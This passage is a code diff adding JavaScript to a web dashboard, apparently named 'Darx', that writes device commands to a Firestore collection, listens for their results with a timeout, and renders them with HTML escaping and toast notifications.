+                else if (p.type === 'range') val = parseInt(val);
+                params[p.key] = val;
+            }
+        });
+
+        executeCommand(cmd.name, cmd.label, params);
+        closeModal();
+    }
+
+    // ============================================================
+    // EXECUTE COMMAND — writes to top-level 'commands' collection
+    // ============================================================
+    function executeCommand(action, label, params) {
+        const cmdId = Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 8);
+        const now = new Date().toLocaleTimeString();
+
+        // Add to local results
+        cmdResults.unshift({
+            id: cmdId,
+            action: action,
+            name: label || action,
+            status: 'sending',
+            output: 'Writing to Firestore…',
+            time: now,
+            params: params
+        });
+        renderAllResults();
+
+        const payload = {
+            deviceId: selectedDeviceId,
+            action: action,
+            params: params || {},
+            createdAt: firebase.firestore.FieldValue.serverTimestamp()
+        };
+
+        // Write to top-level commands/{cmdId} — same as what remote.py and the Android agent expect
+        db.collection('commands').doc(cmdId).set(payload)
+            .then(() => {
+                updateResultStatus(cmdId, 'sent', 'Command written. Waiting for device…');
+                showToast(`→ ${label || action} sent`, 'info');
+
+                // Listen for result
+                const unsub = db.collection('results').doc(cmdId).onSnapshot(snap => {
+                    if (snap.exists) {
+                        const data = snap.data();
+                        const status = data.status || 'error';
+                        const output = data.output || '—';
+                        updateResultStatus(cmdId, status, output);
+                        showToast(
+                            status === 'ok' ? `✓ ${label || action}` : `✗ ${label || action}`,
+                            status === 'ok' ? 'success' : 'error'
+                        );
+                        unsub();
+                    }
+                });
+
+                // Timeout after 30s
+                setTimeout(() => {
+                    const found = cmdResults.find(r => r.id === cmdId);
+                    if (found && (found.status === 'sent' || found.status === 'sending' || found.status === 'pending')) {
+                        updateResultStatus(cmdId, 'pending', '⏱ Device did not respond (offline?)');
+                        unsub();
+                    }
+                }, 30000);
+            })
+            .catch(err => {
+                updateResultStatus(cmdId, 'write_fail', '❌ Write failed: ' + err.message);
+                showToast('Write failed: ' + err.message, 'error');
+            });
+    }
+
+    // ============================================================
+    // REAL-TIME RESULT LISTENER
+    // ============================================================
+    function startResultListener(deviceId) {
+        if (!db) return;
+        if (resultUnsub) { resultUnsub(); resultUnsub = null; }
+
+        // Listen to the 'results' collection for any new results
+        resultUnsub = db.collection('results')
+            .onSnapshot(snapshot => {
+                snapshot.docChanges().forEach(change => {
+                    if (change.type === 'added') {
+                        const docId = change.doc.id;
+                        const data = change.doc.data();
+                        // Only process if it matches our selected device
+                        if (data.deviceId !== deviceId && data.deviceId !== undefined) return;
+
+                        // Check if we already have this result
+                        const existing = cmdResults.find(r => r.id === docId);
+                        if (existing) {
+                            if (existing.status === 'sent' || existing.status === 'sending' || existing.status === 'pending') {
+                                updateResultStatus(docId, data.status || 'error', data.output || '—');
+                                showToast(
+                                    data.status === 'ok' ? `✓ ${existing.name}` : `✗ ${existing.name}`,
+                                    data.status === 'ok' ? 'success' : 'error'
+                                );
+                            }
+                        }
+                    }
+                    if (change.type === 'modified') {
+                        const docId = change.doc.id;
+                        const data = change.doc.data();
+                        const existing = cmdResults.find(r => r.id === docId);
+                        if (existing && (existing.status === 'sent' || existing.status === 'pending')) {
+                            updateResultStatus(docId, data.status || 'error', data.output || '—');
+                        }
+                    }
+                });
+            }, err => {
+                console.log('[Darx] Result listener error:', err.message);
+            });
+    }
+
+    // ============================================================
+    // RESULTS RENDERING
+    // ============================================================
+    function updateResultStatus(id, status, output) {
+        const found = cmdResults.find(r => r.id === id);
+        if (found) {
+            found.status = status;
+            found.output = output;
+        }
+        renderAllResults();
+    }
+
+    function renderResults() {
+        if (cmdResults.length === 0) return '';
+
+        return cmdResults.map(r => {
+            const statusClass = r.status;
+            const safeOutput = escapeHtml(typeof r.output === 'string' ? r.output : JSON.stringify(r.output));
+            return `<div class="result-item">
+                <div class="ri-top">
+                    <span class="ri-action">${escapeHtml(r.name || r.action)}</span>
+                    <span class="ri-status ${statusClass}">${statusClass}</span>
+                    <span class="ri-time">${r.time}</span>
+                </div>
+                <div class="ri-output">${safeOutput}</div>
+            </div>`;
+        }).join('');
+    }
+
+    function renderAllResults() {
+        // Update wherever results are shown
+        const bodies = document.querySelectorAll('#resultsBody');
+        const counts = document.querySelectorAll('#resultCount');
+        bodies.forEach(el => {
+            el.innerHTML = cmdResults.length === 0 ?
+                '<div class="empty-state" style="padding:16px;">No commands sent yet</div>' :
+                renderResults();
+        });
+        counts.forEach(el => {
+            el.textContent = cmdResults.length + ' results';
+        });
+    }
+
+    // ============================================================
+    // TOAST
+    // ============================================================
+    function showToast(msg, type) {
+        const container = document.getElementById('toastContainer');
+        const el = document.createElement('div');
+        el.className = 'toast ' + (type || 'info');
+        el.textContent = msg;
+        container.appendChild(el);
+        setTimeout(() => {
+            el.style.opacity = '0';
+            el.style.transform = 'translateY(-10px)';
+            el.style.transition = 'all 0.3s';
+            setTimeout(() => el.remove(), 300);
+        }, 3500);
+    }
+
+    // ============================================================
+    // UTILITY
+    // ============================================================
+    function escapeHtml(str) {
+        if (!str) return '';
+        const d = document.createElement('div');
+        d.textContent = str;
+        return d.innerHTML;
+    }
+
+    // Close modal on overlay click
+    document.getElementById('modalOverlay').addEventListener('click', function(e) {
+        if (e.target === this) closeModal();
+    });
+
+    // ============================================================
+    // Handle the case where the user is already logged in via session
+    // on page load — auth.onAuthStateChanged handles it above.
+    // ============================================================
+    console.log('[Darx] Dashboard initialized. Waiting for auth…');
     </script>
 </body>
 </html>
